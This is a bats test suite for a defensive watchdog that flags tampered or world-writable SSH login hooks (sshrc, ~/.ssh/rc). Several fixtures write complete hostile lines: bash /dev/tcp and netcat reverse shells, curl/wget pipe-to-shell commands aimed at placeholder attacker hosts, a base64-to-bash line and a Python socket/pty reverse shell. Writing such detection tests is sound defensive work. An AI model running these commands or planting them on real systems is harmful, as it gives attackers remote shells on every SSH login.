#!/usr/bin/env bats
# L2 bats functional tests for the sshrc-watchdog scan script.
#
# /etc/ssh/sshrc (and ~/.ssh/rc) is run by sshd for EVERY successful SSH
# login, before the user's shell — a per-login exec surface that fires on a
# legitimate credentialed login (T1546). A file that is world-writable /
# non-root-owned, or contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-sshrc-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/sshrc-watchdog/systemd/sshrc-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SSHRC="${TMP}/sshrc"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SSHRC_PROFILE="${PROFILE:-report}" \
    SELFDEF_SSHRC_BASELINE="${BASELINE}" \
    SELFDEF_SSHRC_FILES="${FILES_V:-$SSHRC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# sshrc\nif read proto cookie && [ -n "$DISPLAY" ]; then :; fi\n' > "${SSHRC}"
}

@test "no sshrc → ok / no_sshrc" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_sshrc"'
    cap | grep -q '"severity":"ok"'
}

@test "benign sshrc, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged sshrc on second run → ok / sshrc_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"sshrc_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in sshrc → alert / sshrc_suspicious" {
    seed_benign
    run_wd
    printf '# sshrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"sshrc_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable sshrc → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign sshrc change → warn / sshrc_changed" {
    seed_benign
    run_wd
    printf '# sshrc\nif read proto cookie; then logger "ssh login"; fi\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"sshrc_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned sshrc is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious sshrc" {
    seed_benign
    run_wd
    printf '# sshrc\ncurl http://evil/p|sh\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — sshrc inventory enumerates per-SSH-login exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in sshrc → alert" {
    seed_benign
    run_wd
    printf '# sshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in sshrc → alert" {
    seed_benign
    run_wd
    printf '# sshrc\nwget -qO- http://attacker/p | sh\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in sshrc → alert" {
    seed_benign
    run_wd
    printf '# sshrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable sshrc): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable sshrc): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${SSHRC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-sshrc -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): sshrc-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 per-SSH-login exec surface — injection alert must
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '# sshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"sshrc_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# sshrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nif read proto cookie; then :; fi\n' > "${SSHRC}"
    run_wd
    ! cap | grep -q '"event":"sshrc_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: ~/.ssh/rc also scanned via FILES_V — full per-login surface)" {
    # /etc/ssh/sshrc is the system-wide per-SSH-login hook;
    # ~/.ssh/rc is the per-user variant. Attackers may target
    # either. Lock multi-file axis.
    USERRC="${TMP}/user-sshrc"
    seed_benign
    FILES_V="${SSHRC} ${USERRC}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in the per-user variant.
    printf '# user .ssh/rc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USERRC}"
    FILES_V="${SSHRC} ${USERRC}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection
    # of the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# sshrc\ncurl -s http://attacker.com/p | bash\n' > "${SSHRC}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (sample names offending file in JSON — operator triage routing)" {
    # When an injection-pattern alert fires, sample MUST surface the
    # file path so operator dashboard routes triage to the right
    # path (sister contract: polkit-rules/nfs-exports/rhosts/tmpfiles
    # /securetty sample-naming pattern).
    USERRC="${TMP}/user-distinctive-attacker.rc"
    seed_benign
    FILES_V="${SSHRC} ${USERRC}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .ssh/rc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USERRC}"
    FILES_V="${SSHRC} ${USERRC}" run_wd
    cap | grep -q 'user-distinctive-attacker'
}

@test "INVARIANT (nc reverse-shell variant: netcat-listening pipe also detected — sister to bash -i /dev/tcp axis)" {
    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are a
    # canonical RCE primitive. Lock detection alongside the bash
    # /dev/tcp variant.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# sshrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${SSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant: socket.socket(AF_INET...)+ os.dup2 — interpreter-rev-shell axis)" {
    # Sister to many other watchdog's interpreter-rev-shell INVARIANT
    # across the brain. Beyond bash/sh/nc, attackers reach for
    # python -c 'import socket,os...' to dodge shell-pattern
    # detectors. Lock the python interpreter axis on the
    # per-SSH-login exec surface (T1546 — /etc/ssh/sshrc executes
    # AS THE LOGGING-IN USER on every SSH session).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# sshrc\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${SSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
